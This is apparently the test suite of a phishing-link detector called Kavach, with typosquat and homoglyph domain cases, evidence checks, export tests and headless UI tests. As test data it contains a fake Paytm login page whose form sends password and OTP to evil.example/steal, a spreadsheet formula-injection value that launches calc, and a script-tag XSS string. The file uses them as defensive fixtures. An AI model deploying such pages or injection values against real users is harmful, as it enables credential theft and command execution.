"""
Kavach - all the tests, in one command:

    python test_rules.py

Prints a table for each section and a summary, and exits with code 1 if anything fails.
No pytest needed. It takes about a minute, because it also runs the real app without a browser.

To add a link test, add a line to LINK_CASES. Expected verdicts are what the link SHOULD get, so if
a test fails, look at why before changing the expected verdict. The comments mark the few verdicts
that the ML model decides: retraining can flip those, and then it is worth a look, not a panic.
"""
import io
import json
import subprocess
import sys
import tempfile
from pathlib import Path

import pandas as pd
from PIL import Image, ImageDraw, ImageFilter

# The shared logic only. Don't import app.py here: that starts the Streamlit UI.
import detector
import outputs
import page_compare
from lookalikes import variants

HERE = Path(__file__).parent
sys.stdout.reconfigure(errors="backslashreplace")  # a Windows console can't print every letter

# (input, expected verdict)
LINK_CASES = [
    # --- One typo from a brand ---
    ("yutube.com", "Phishing"),
    ("youtbe.com", "Phishing"),
    ("gooogle.com", "Phishing"),
    ("hdfcbnak.com", "Phishing"),
    ("yuotube.com", "Phishing"),
    ("youtubee.com", "Phishing"),
    ("youtibe.com", "Phishing"),
    ("flipkrat.com", "Phishing"),
    ("googel.com", "Phishing"),
    ("goggle.com", "Phishing"),
    ("googl.xyz", "Phishing"),
    ("googll.store", "Phishing"),
    ("tawitter.com", "Phishing"),
    ("https://yutube.com/watch?v=1", "Phishing"),
    ("www.yutube.com", "Phishing"),

    # --- Fake letters, Cyrillic and xn-- names ---
    ("paytrn.com", "Phishing"),
    ("gmai1.com", "Phishing"),
    ("sb1.co.in", "Phishing"),
    ("xn--pytm-53d.com", "Phishing"),
    ("pаytm.com", "Phishing"),                # Cyrillic a
    ("рауtm.com", "Phishing"),      # every possible letter is Cyrillic
    ("ѕbi.co.in", "Phishing"),                # Cyrillic s
    ("rеddit.com", "Suspicious"),             # Cyrillic e, on a popular site

    # --- 3-4 letter brand plus only scam words: +60 on its own ---
    ("sbikyc.net", "Phishing"),
    ("sbilogin.net", "Phishing"),
    ("kycsbi.net", "Phishing"),
    ("sbi-kyc.net", "Phishing"),
    ("sbi-bank.in", "Phishing"),
    ("jiokyc.net", "Phishing"),
    ("npci-verify.net", "Phishing"),

    # --- Other brands hidden inside the name ---
    ("sbi-kyc-update-now.top", "Phishing"),
    ("onlinesbi-kyc-update.xyz", "Phishing"),
    ("ama-zon-login.net", "Phishing"),
    ("hdfc-bank-login.com", "Phishing"),
    ("hdfc-bank-login.net", "Phishing"),
    ("my-sbi-login.net", "Phishing"),
    ("startamazonstore.net", "Phishing"),          # 45 from rules; ML raises it, so a retrain can flip it
    ("paytmkyc.net", "Suspicious"),
    ("myflipkartoffer.net", "Suspicious"),

    # --- Brand in a subdomain ---
    ("amazon.security-check.icu", "Phishing"),
    ("paytm-login.weebly.com", "Phishing"),
    ("startamazonstore.weebly.com", "Phishing"),
    ("paytm-kyc-verify-login.github.io", "Phishing"),
    ("paytm-login.s3.amazonaws.com", "Phishing"),
    ("sbi-login.wikipedia.org", "Phishing"),
    ("sbi.bank.in.evil.com", "Phishing"),
    # spotify.com's owner controls this subdomain, so it is a warning, not proof.
    # 45 from rules; ML raises it, so a retrain can flip it.
    ("paytm.spotify.com", "Suspicious"),

    # --- The @ trick ---
    ("sbi.bank.in@evil.com", "Phishing"),
    ("https://paytm.com@x.xyz/login", "Phishing"),
    ("netflix.com@evil.com", "Phishing"),
    ("paytm-login@evil.com", "Phishing"),
    ("pay.google.com@evil.com", "Phishing"),
    ("sbi.bank.in.foo@evil.com", "Phishing"),
    ("paytm.com:x@evil.com", "Phishing"),
    ("paytm.com@google.com", "Phishing"),
    ("https://user:pass@evil.com", "Suspicious"),
    ("user@evil.com", "Suspicious"),
    ("@evil.com", "Suspicious"),
    ("fedex.com@evil.com", "Suspicious"),          # must not count as x.com
    ("user@reddit.com", "Suspicious"),             # trusted host: only the @ points count
    ("user@sbi.bank.in", "Suspicious"),
    ("user@accounts.spotify.com", "Suspicious"),
    ("someone@gmail.com", "Suspicious"),

    # --- An @ in the path is harmless ---
    ("evil.com/sbi.bank.in", "Safe"),
    ("evil.com/a@b.com", "Safe"),
    ("reddit.com/u/a@b", "Safe"),
    ("https://reddit.com/?to=paytm.com@x", "Safe"),

    # --- Popular sites: typos and abused names ---
    ("rediit.com", "Suspicious"),
    ("wikipeda.org", "Suspicious"),
    ("spotify-offer.net", "Suspicious"),
    ("reddit.biz", "Suspicious"),
    ("reddit.xyz", "Phishing"),                    # 45 for the name + 15 for .xyz
    ("reddit-login.com", "Phishing"),              # 55 from rules; ML raises it, so a retrain can flip it

    # --- Everyday words are not called Phishing ---
    ("tomato.in", "Suspicious"),
    ("mantra.in", "Suspicious"),
    ("email.in", "Suspicious"),
    ("kodak.in", "Suspicious"),
    ("apply.in", "Suspicious"),
    ("twister.in", "Suspicious"),

    # --- Free hosting: anyone can publish there, so subdomains are not automatically Safe ---
    ("random.weebly.com", "Suspicious"),
    ("random.github.io", "Suspicious"),
    ("random.blogspot.com", "Suspicious"),
    ("random.duckdns.org", "Suspicious"),
    ("phish.s3.amazonaws.com", "Suspicious"),
    ("random.plesk.page", "Suspicious"),
    ("random.trycloudflare.com", "Suspicious"),

    # --- Official domains ---
    ("youtube.com", "Safe"),
    ("google.com", "Safe"),
    ("x.com", "Safe"),
    ("pay.google.com", "Safe"),
    ("mail.google.com", "Safe"),
    ("bhimupi.org.in", "Safe"),
    ("npci.org.in", "Safe"),
    ("epfindia.gov.in", "Safe"),

    # --- Verified Indian banks ---
    ("sbi.bank.in", "Safe"),
    ("www.hdfc.bank.in", "Safe"),
    ("https://KOTAK.bank.in/login", "Safe"),
    ("sbi.bank.in.", "Safe"),

    # --- Popular real sites, including the hosting companies themselves ---
    ("reddit.com", "Safe"),
    ("www.reddit.com", "Safe"),
    ("HTTPS://WWW.Reddit.com/r/india", "Safe"),
    ("weebly.com", "Safe"),
    ("amazonaws.com", "Safe"),
    ("kotaku.com", "Safe"),
    ("googl.com", "Safe"),
    ("telegra.ph", "Safe"),
    ("kodak.com", "Safe"),
    ("mail.com", "Safe"),

    # --- Subdomains of popular real sites ---
    ("accounts.spotify.com", "Safe"),
    ("en.wikipedia.org", "Safe"),
    ("login.yahoo.com", "Safe"),
    ("secure.chase.com", "Safe"),
    ("support.mozilla.org", "Safe"),
    ("login.reddit.com", "Safe"),
    ("old.reddit.com", "Safe"),
    ("docs.python.org", "Safe"),
    ("news.ycombinator.com", "Safe"),
    ("lesbian.example.com", "Safe"),

    # --- Ordinary names that only look like they contain a brand ---
    ("pineapple.com", "Safe"),
    ("lesbian.com", "Safe"),
    ("sunrisebakery.in", "Safe"),
    ("sbismith.net", "Safe"),
    ("reddit-fans.net", "Safe"),
    ("forms.net", "Safe"),
    ("office.biz", "Safe"),
]

# When the SMS feature lands:
#   1. add MESSAGE_CASES = [("Your KYC expires, verify at sbi-kyc.top", "Phishing"), ...] here
#   2. write check_message(text, bundle), which returns (verdict, score) like check_link() below
#   3. in main(), add: run_cases("Messages", MESSAGE_CASES, check_message, bundle)

# link, nearest genuine, closeness %, edit distance, attack type, text that must be in the edits
EVIDENCE_CASES = [
    ("yutube.com", "youtube.com", 86, 1, "missing_letter", "missing 'o' at position 2"),
    ("yuotube.com", "youtube.com", 86, 1, "swapped_letters", "'ou' swapped to 'uo'"),
    ("sbii.co.in", "sbi.co.in", 75, 1, "extra_letter", "extra 'i'"),
    ("paytrn.com", "paytm.com", 99, 0, "homoglyph", "'rn' replaces 'm' at position 5"),
    ("amaz0n.com", "amazon.in", 99, 0, "homoglyph", "'0' replaces 'o'"),
    ("pаytm.com", "paytm.com", 99, 0, "cyrillic", "Cyrillic 'а' replaces 'a' at position 2"),
    ("xn--pytm-53d.com", "paytm.com", 99, 0, "cyrillic", "Cyrillic 'а' replaces 'a' at position 2"),
    ("pay-tm.com", "paytm.com", 99, 0, "hyphen", "hyphen added"),
    ("startamazonstore.net", "amazon.in", 38, 10, "combosquat",
     "Contains the full brand name 'amazon' plus extra words 'start' and 'store'"),
    ("sbikyc.net", "sbi.co.in", 50, 3, "combosquat", "Contains the full brand name 'sbi' plus extra word 'kyc'"),
    ("sbi-kyc-update-now.top", "sbi.co.in", 20, 12, "combosquat",
     "Contains the full brand name 'sbi' plus extra words 'kyc', 'update' and 'now'"),
    ("amaz0n-rewards.top", "amazon.in", 46, 7, "homoglyph",
     "Contains the brand name 'amazon' (with fake letters) plus extra word 'rewards'"),
    ("reddit.xyz", "reddit.com", 99, 0, "tld_swap", "ending '.xyz' instead of '.com'"),
    ("amazon.security-check.icu", "amazon.in", 32, 13, "subdomain_abuse", "the real domain here is security-check.icu"),
    ("cloudflare.secure-login.xyz", "cloudflare.com", 48, 11, "subdomain_abuse", "the real domain here is secure-login.xyz"),
    ("sbi.bank.in@evil.com", "sbi.bank.in", None, None, "at_trick", "the browser goes to evil.com"),
    ("google.com", "google.com", 100, 0, "none", None),
    ("accounts.spotify.com", "spotify.com", 100, 0, "none", None),
    ("sbi.bank.in", "sbi.bank.in", 100, 0, "none", None),
    ("192.168.1.1", None, None, None, "none", None),
]

# link, text that must be in the reasons
REASON_CASES = [
    ("yutube.com", "One typo away from 'youtube': missing 'o' at position 2"),
    ("paytrn.com", "Fake letters copy 'paytm': 'rn' replaces 'm' at position 5"),
    ("pay-tm.com", "Hyphen added to copy 'paytm'"),
    ("sbikyc.net", "Brand 'sbi' with only scam words added: 'sbikyc'"),
    ("reddit.xyz", "Uses the name of popular site 'reddit.com'"),
    ("rеddit.com", "Fake letters copy popular site 'reddit.com'"),
    ("a-b-c.xyz", "Many hyphens: 2 in 'a-b-c'"),
    ("sbi.bank.in@evil.com", "Uses @ to hide the real address — the browser goes to evil.com"),
    ("192.168.1.1", "Raw IP address instead of a name: 192.168.1.1"),
]

GENUINE_PAGE = b"""<html><head><title>Paytm - Sign in to your account</title><link rel="icon" href="/img/favicon.ico?v=2">
<script>var hidden_script_text = "do not read me";</script><style>.x{color:red}</style></head><body>
<img src="https://cdn.paytm.com/assets/paytm-logo.png"><h1>Sign in to Paytm</h1><p>Pay bills, recharge your phone and send money securely.
Your money is protected by Paytm. Contact customer care for help.</p>
<form><input type="text" name="mobile"><input type="password" name="password"><input type="hidden" name="csrf"><input type="submit"></form></body></html>"""
FAKE_PAGE = b"""<html><head><title>Paytm - Sign in to your account!</title><link rel="icon" href="favicon.ico"></head><body>
<img src="./files/paytm-logo.png"><h1>Sign in to Paytm</h1><p>Pay bills, recharge your phone and send money securely.
Your money is protected by Paytm. Contact customer care for help. Enter the OTP to verify KYC.</p>
<form action="https://evil.example/steal"><input type="text" name="mobile"><input type="password" name="password"><input type="text" name="otp" placeholder="Enter OTP"></form></body></html>"""
UNRELATED_PAGE = b"""<html><head><title>Grandma's apple pie recipe</title></head><body><img src="pie.jpg"><p>Mix flour, butter and sugar, then bake
for an hour until golden. Serve warm with cream.</p></body></html>"""


def login_screenshot(extra_text=False, size=(900, 700)):
    """A made-up login page: header bar, logo, two form boxes and a button."""
    image = Image.new("RGB", size, "white")
    draw = ImageDraw.Draw(image)
    w, h = size
    blue = (0, 90, 170)
    draw.rectangle([0, 0, w, h // 8], fill=blue)
    draw.ellipse([w // 2 - 50, h // 5, w // 2 + 50, h // 5 + 100], fill=blue)
    for i in range(2):
        draw.rectangle([w // 4, h // 2 + i * h // 8, 3 * w // 4, h // 2 + i * h // 8 + h // 14], outline="gray", width=3)
    draw.rectangle([w // 4, 3 * h // 4, 3 * w // 4, 3 * h // 4 + h // 14], fill=blue)
    if extra_text:
        draw.text((w // 4, h - 40), "Enter OTP to verify", fill="red")
    return image


def unrelated_screenshot(size=(900, 700)):
    image = Image.new("RGB", size, (250, 240, 200))
    draw = ImageDraw.Draw(image)
    for i in range(0, 900, 60):
        draw.line([i, 0, 900 - i, 700], fill=(180, 80, 40), width=8)
    draw.rectangle([60, 60, 500, 500], fill=(90, 160, 60))
    draw.ellipse([400, 300, 850, 680], fill=(200, 60, 60))
    return image


def image_bytes(image, fmt="PNG") -> bytes:
    buffer = io.BytesIO()
    image.save(buffer, fmt)
    return buffer.getvalue()


# ---------------- the extra sections: each one yields (check name, passed, detail) ----------------

def check_evidence(bundle):
    """Nearest genuine domain, closeness %, exact edits, reasons, Did you mean and ML skipping."""
    for link, near, close, distance, attack, edit in EVIDENCE_CASES:
        ev = detector.full_analysis(link, bundle)["evidence"]
        problems = []
        if ev["nearest_genuine"] != near:
            problems.append(f"nearest {ev['nearest_genuine']}")
        if close is not None and ev["closeness"] != close:
            problems.append(f"closeness {ev['closeness']}")
        if distance is not None and ev["edit_distance"] != distance:
            problems.append(f"distance {ev['edit_distance']}")
        if ev["attack_type"] != attack:
            problems.append(f"attack {ev['attack_type']}")
        if edit and not any(edit in line for line in ev["edits"]):
            problems.append(f"edits {ev['edits']}")
        yield f"evidence: {link}", not problems, "; ".join(problems) or f"{ev['closeness']}% {ev['attack_type']}"

    for link, text in REASON_CASES:
        reasons = detector.full_analysis(link, bundle)["reasons"]
        yield f"reason: {link}", text in reasons, reasons[:70]

    combo = detector.full_analysis("startamazonstore.net", bundle)["evidence"]
    yield "attack label: Combosquatting", combo["attack_label"] == "Combosquatting", combo["attack_label"]

    # Only the real site itself may ever show 100%
    fakes = [link for link, _ in LINK_CASES]
    for domain in ("paytm.com", "reddit.com", "amazon.in", "sbi.co.in"):
        fakes += [fake for group in variants(domain).values() for fake in group]
    wrong = []
    for link in fakes:
        ev = detector.full_analysis(link, bundle)["evidence"]
        if ev["closeness"] >= 100 and not ev["is_genuine"]:
            wrong.append(link)
    yield "no 100% closeness unless genuine", not wrong, f"{len(fakes)} links, wrong: {wrong[:5]}"

    for link, target in (("paytrn.com", "paytm.com"), ("rediit.com", "reddit.com"), ("google.com", None), ("pineapple.com", None)):
        got = detector.lookalike_target(link)
        yield f"did you mean: {link}", got == target, str(got)
    for link, skipped in (("google.com", True), ("sbi.bank.in", True), ("reddit.com", True), ("accounts.spotify.com", True),
                          ("user@reddit.com", True), ("random.weebly.com", False), ("phish.s3.amazonaws.com", False), ("yutube.com", False)):
        ml = detector.full_analysis(link, bundle)["ml_probability"]
        yield f"ML {'skipped' if skipped else 'runs'}: {link}", (ml is None) == skipped, f"ML {ml}"


def check_exports(bundle):
    """CSV, JSON and Excel have the right columns, and the command-line tool works."""
    domains = outputs.read_domains((HERE / "sample_domains.csv").read_bytes(), "sample_domains.csv")
    rows, _ = outputs.check_many(domains, bundle)
    csv_table = pd.read_csv(io.BytesIO(outputs.to_csv(rows)), encoding="utf-8-sig")
    json_rows = json.loads(outputs.to_json(rows))
    xlsx_table = pd.read_excel(io.BytesIO(outputs.to_xlsx(rows)))

    yield "CSV columns", list(csv_table.columns) == outputs.COLUMNS, f"{len(csv_table)} rows"
    yield "JSON columns", list(json_rows[0]) == outputs.COLUMNS, f"{len(json_rows)} rows"
    yield "Excel columns", list(xlsx_table.columns) == outputs.COLUMNS, f"{len(xlsx_table)} rows"
    verdicts = [row["verdict"] for row in rows]
    yield "same verdicts in every format", list(csv_table["verdict"]) == verdicts == list(xlsx_table["verdict"]), ""

    one_by_one = [outputs.flat_row(detector.full_analysis(d, bundle)) for d in domains]
    yield "list check matches one at a time", rows == one_by_one, ""

    # A list can contain anything, and a spreadsheet must never run it as a formula
    risky, _ = outputs.check_many(["=cmd|'/c calc'!A1", "-evil.com", "@evil.com", "pаytm.com"], bundle)
    import openpyxl
    sheet = openpyxl.load_workbook(io.BytesIO(outputs.to_xlsx(risky))).active
    cells = [cell for cell in sheet["A"]][1:]
    yield "Excel never gets a formula", all(c.data_type != "f" and not str(c.value).startswith(("=", "-", "@")) for c in cells), ""
    yield "Excel keeps Cyrillic", any("а" in str(c.value) for c in cells), ""
    text = outputs.to_csv(risky).decode("utf-8-sig")
    yield "CSV never gets a formula", not any(f"\n{mark}" in text for mark in "=-@"), ""

    for data, name, message in ((b"url\nx.com\n", "bad.csv", "domain"), (b"", "empty.csv", "read this CSV"), (b"\n\n", "empty.txt", "No domains")):
        try:
            outputs.read_domains(data, name)
            yield f"clear error: {name}", False, "no error raised"
        except ValueError as err:
            yield f"clear error: {name}", message in str(err), str(err)[:60]
    listed = outputs.read_domains(b"# my list\nyutube.com\n\n  paytrn.com  \n", "list.txt")
    yield "text file: skips comments and blanks", listed == ["yutube.com", "paytrn.com"], str(listed)

    # The command-line tool, run for real in a temporary folder
    with tempfile.TemporaryDirectory() as folder:
        folder = Path(folder)
        (folder / "list.txt").write_text("yutube.com\npaytrn.com\ngoogle.com\n", encoding="utf-8")

        def cli(*args):
            return subprocess.run([sys.executable, str(HERE / "kavach_cli.py"), *args], capture_output=True, text=True, cwd=folder)

        for fmt in outputs.EXPORTERS:
            done = cli("list.txt", "--format", fmt, "--out", f"out.{fmt}")
            yield f"CLI writes {fmt}", done.returncode == 0 and (folder / f"out.{fmt}").stat().st_size > 0, done.stdout.split("\n")[0][:60]
        done = cli("list.txt")
        yield "CLI default output name", done.returncode == 0 and (folder / "list_results.csv").exists(), ""
        done = cli("nope.csv")
        yield "CLI: missing file", done.returncode != 0 and "can't find" in done.stderr and "Traceback" not in done.stderr, done.stderr[:50]
        done = cli("list.txt", "--out", "list.txt", "--format", "csv")
        yield "CLI won't overwrite its input", done.returncode != 0 and "overwrite" in done.stderr, ""
        yield "CLI left the input alone", (folder / "list.txt").read_text(encoding="utf-8").startswith("yutube.com"), ""

    loaded = subprocess.run([sys.executable, "-c", "import sys, outputs, detector; print('streamlit' in sys.modules)"],
                            capture_output=True, text=True, cwd=HERE).stdout.strip()
    yield "detection code doesn't load Streamlit", loaded == "False", loaded


def check_pages(bundle):
    """Saved HTML and screenshot comparison, on pages made up for the test."""
    page = page_compare.read_page(GENUINE_PAGE)
    yield "HTML: script and style ignored", "do not read me" not in page["text"] and ".x{color" not in page["text"], ""
    yield "HTML: form fields", page["fields"] == {"mobile", "password"}, str(sorted(page["fields"]))
    yield "HTML: image names", page["images"] == {"paytm-logo.png", "favicon.ico"}, str(sorted(page["images"]))
    yield "HTML: finds a password field, no OTP", page["has_password"] and not page["has_otp"], ""

    fake = page_compare.compare_html(FAKE_PAGE, GENUINE_PAGE)
    yield "HTML: copied page is high", fake["content_similarity"] >= page_compare.HIGH_CONTENT, f"{fake['content_similarity']}%"
    yield "HTML: warns about password and OTP", fake["asks_for_password"] and fake["asks_for_otp"], ""
    yield "HTML: same page is 100%", page_compare.compare_html(GENUINE_PAGE, GENUINE_PAGE)["content_similarity"] == 100, ""
    other = page_compare.compare_html(UNRELATED_PAGE, GENUINE_PAGE)
    yield "HTML: unrelated page is low", other["content_similarity"] < 25, f"{other['content_similarity']}%"
    for label, a, b in (("empty files", b"", b""), ("broken HTML", b"\xff\xfe<<<<>><title>x", b"not html"), ("no real words", b"<p>!!!</p>", b"<p>???</p>")):
        yield f"HTML: {label} don't crash", isinstance(page_compare.compare_html(a, b)["content_similarity"], int), ""

    real = login_screenshot()
    high = page_compare.HIGH_VISUAL
    similar = page_compare.compare_images
    yield "image: same is 100%", similar(image_bytes(real), image_bytes(real))["visual_similarity"] == 100, ""
    for label, image, fmt in (("small extra text", login_screenshot(extra_text=True), "PNG"), ("different size", login_screenshot(size=(640, 480)), "PNG"),
                              ("saved as JPEG", real, "JPEG"), ("slightly blurred", real.filter(ImageFilter.GaussianBlur(2)), "PNG")):
        score = similar(image_bytes(image, fmt), image_bytes(real))["visual_similarity"]
        yield f"image: {label} is high", score >= high, f"{score}%"
    score = similar(image_bytes(unrelated_screenshot()), image_bytes(real))["visual_similarity"]
    yield "image: unrelated page is low", score < high / 2, f"{score}%"
    try:
        similar(b"not an image", image_bytes(real))
        yield "image: junk file gives an error", False, "no error raised"
    except ValueError as err:
        yield "image: junk file gives an error", "PNG or JPG" in str(err), str(err)[:50]

    for args, level in (((90, None, True), "strong"), ((None, 90, True), "strong"), ((10, 10, True), "none"), ((90, 90, False), "same_site"),
                        ((90, None, None), "strong"), ((None, None, True), "none"), ((69, 79, True), "none"), ((70, 0, True), "strong"), ((0, 80, True), "strong")):
        got = page_compare.conclusion(*args)[0]
        yield f"conclusion {args}", got == level, got


def check_ui(bundle):
    """The real app.py, run by Streamlit's own test tool without a browser. This doesn't check how
    it looks: colours and layout are in the manual checks in the README."""
    from streamlit.testing.v1 import AppTest

    def fresh():
        return AppTest.from_file(str(HERE / "app.py"), default_timeout=90).run()

    def page_text(app):
        return " ".join(m.value for m in app.markdown)

    app = fresh()
    yield "app starts", not app.exception, ""
    labels = [b.label for b in app.button]
    yield "example buttons", labels == ["paytrn.com", "sbi-kyc-update-now.top", "amazon.security-check.icu", "rediit.com", "google.com"], str(labels)[:60]

    # link, words on the page, closeness, final risk score (None = not checked)
    for link, words, close, final in (
            ("yutube.com", ["Phishing", "One typo away from", "Did you mean"], "86%", "60/100"),
            ("rediit.com", ["Suspicious", "Did you mean"], "83%", "45/100"),
            ("startamazonstore.net", ["Contains the full brand name"], "38%", None),
            ("reddit.com", ["Safe", "✅ Popular real website"], "100%", "0/100"),
            ("sbi.bank.in", ["Safe", "✅ Verified Indian bank domain"], "100%", "0/100"),
            ("accounts.spotify.com", ["Safe", "✅ Subdomain of popular real website spotify.com"], "100%", "0/100"),
            ("sbi.bank.in@evil.com", ["Phishing", "\U0001F6A9 Uses @ to hide", "Did you mean"], None, "60/100")):
        app.text_input(key="link_input").set_value(link).run()
        text = page_text(app)
        metrics = [m.value for m in app.metric][:3]
        missing = [word for word in words if word not in text]
        good = not app.exception and not missing and (close is None or metrics[0] == close) and (final is None or metrics[2] == final)
        yield f"check a link: {link}", good, f"{metrics} missing={missing}"

    app.text_input(key="link_input").set_value("paytrn.com").run()
    text = page_text(app)
    yield "evidence: red changed letters", '<span class="k-changed">rn</span>' in text and '<span class="k-changed">m</span>' in text, ""
    yield "evidence: heading and edits", any(h.value == "Similarity evidence" for h in app.subheader) and "replaces &#x27;m&#x27;" in text, ""
    yield "fake letters show 99%, not 100%", app.metric[0].value == "99%", app.metric[0].value
    result = json.loads(app.code[0].value)
    yield "single result as JSON", result["attack_type"] == "homoglyph" and list(result) == outputs.COLUMNS, ""
    yield "single result download", "Download JSON" in [b.label for b in app.get("download_button")], ""

    app.text_input(key="link_input").set_value("yutube.com").run()
    yield "evidence: missing letter struck through", '<span class="k-missing">o</span>' in page_text(app), ""
    app.text_input(key="link_input").set_value("<script>alert(1)</script>.com").run()
    yield "pasted HTML is escaped", not app.exception and "<script>" not in page_text(app).split("</style>")[-1], ""
    app.text_input(key="link_input").set_value("google.com").run()
    yield "genuine site has no evidence box", not any(h.value == "Similarity evidence" for h in app.subheader), ""

    headings = {h.value for h in app.subheader}
    wanted = {"The three scores", "Model performance", "Tests on synthetic look-alikes", "Speed", "Output formats"}
    yield "How it works sections", wanted <= headings, str(sorted(wanted - headings))
    yield "How it works: data and CLI", "PhiUSIIL" in page_text(app) and any("kavach_cli.py" in c.value for c in app.code), ""

    app = fresh()
    app.file_uploader(key="batch_file").upload("sample_domains.csv", (HERE / "sample_domains.csv").read_bytes(), "text/csv").run()
    metrics = {m.label: m.value for m in app.metric}
    yield "list: no error", not app.exception, ""
    yield "list: speed shown", {"Domains checked", "Time per domain", "Domains per second"} <= set(metrics), str(metrics.get("Time per domain"))
    downloads = [b.label for b in app.get("download_button")]
    yield "list: three downloads", downloads == ["Download CSV", "Download JSON", "Download XLSX"], str(downloads)
    table = app.dataframe[0].value
    table = getattr(table, "data", table)  # a styled table keeps its data in .data
    yield "list: results table", list(table.columns) == outputs.COLUMNS and len(table) == 10, f"{len(table)} rows"

    app = fresh()
    app.file_uploader(key="batch_file").upload("bad.csv", b"url\nx.com\n", "text/csv").run()
    yield "list: clear error for a bad CSV", not app.exception and any("domain" in e.value for e in app.error), ""

    app = fresh()
    yield "compare page: asks for files", any("Upload both" in i.value for i in app.info), ""
    app.text_input(key="link_input").set_value("paytrn.com").run()
    app.file_uploader(key="bad_html").upload("fake.html", FAKE_PAGE, "text/html").run()
    app.file_uploader(key="good_html").upload("real.html", GENUINE_PAGE, "text/html").run()
    metrics = {m.label: m.value for m in app.metric}
    yield "compare page: HTML compared", not app.exception and metrics.get("Content similarity", "").endswith("%"), metrics.get("Content similarity", "")
    yield "compare page: strong evidence", any("Strong phishing evidence" in e.value for e in app.error), ""
    yield "compare page: password and OTP warning", any("password" in w.value and "OTP" in w.value for w in app.warning), ""
    yield "compare page: risk score unchanged", metrics.get("Final risk score") == "70/100", metrics.get("Final risk score", "")
    app.file_uploader(key="bad_image").upload("fake.png", image_bytes(login_screenshot(extra_text=True)), "image/png").run()
    app.file_uploader(key="good_image").upload("real.png", image_bytes(login_screenshot()), "image/png").run()
    visual = {m.label: m.value for m in app.metric}.get("Visual similarity", "")
    yield "compare page: screenshots compared", not app.exception and visual.endswith("%"), visual
    app.text_input(key="link_input").set_value("paytm.com").run()
    yield "compare page: genuine link", not app.exception and any("genuine site" in s.value for s in app.success), ""


# ---------------- running and printing ----------------

def check_link(link: str, bundle) -> tuple:
    """Returns (verdict, score) for one link."""
    result = detector.full_analysis(link, bundle)
    return result["verdict"], result["score"]


def run_cases(title: str, cases: list, check, bundle) -> tuple:
    """Print a table of (input, expected) cases. Returns (passed, total)."""
    width = max(len(ascii(case[0])) for case in cases)
    print(f"\n{title}")
    print(f"{'input':<{width}}  {'expected':<10}  {'got':<10}  {'score':>5}  result")
    print("-" * (width + 40))
    passed = 0
    for text, expected in cases:
        got, score = check(text, bundle)
        ok = got == expected
        passed += ok
        # ascii() so Cyrillic letters show as а instead of looking exactly like the Latin ones
        print(f"{ascii(text):<{width}}  {expected:<10}  {got:<10}  {score:>5}  {'PASS' if ok else 'FAIL'}")
    print(f"{passed}/{len(cases)} passed")
    return passed, len(cases)


def run_checks(title: str, section, bundle) -> tuple:
    """Print a table of one section's checks. A crash counts as a failed check, not the end of
    the run, so one missing package can't hide the results of every other section."""
    print(f"\n{title}")
    print(f"{'check':<52}  result  detail")
    print("-" * 90)
    passed = total = 0
    try:
        for name, ok, detail in section(bundle):
            total += 1
            passed += bool(ok)
            print(f"{ascii(name)[1:-1]:<52}  {'PASS' if ok else 'FAIL'}    {ascii(str(detail))[1:-1]}")
    except Exception as err:  # noqa: BLE001 - report anything that goes wrong as a failure
        total += 1
        print(f"{'section stopped early':<52}  FAIL    {type(err).__name__}: {ascii(str(err))[:70]}")
    print(f"{passed}/{total} passed")
    return passed, total


def main():
    bundle = detector.load_model()
    if bundle is None:
        print("model.joblib is missing, so the expected verdicts don't apply. Run: python train.py")
        sys.exit(1)

    results = [run_cases("Links", LINK_CASES, check_link, bundle),
               run_checks("Evidence", check_evidence, bundle),
               run_checks("Exports and command-line tool", check_exports, bundle),
               run_checks("Page comparison", check_pages, bundle),
               run_checks("App (headless)", check_ui, bundle)]
    passed = sum(result[0] for result in results)
    total = sum(result[1] for result in results)
    print(f"\n{passed}/{total} passed")
    sys.exit(0 if passed == total else 1)


if __name__ == "__main__":
    main()
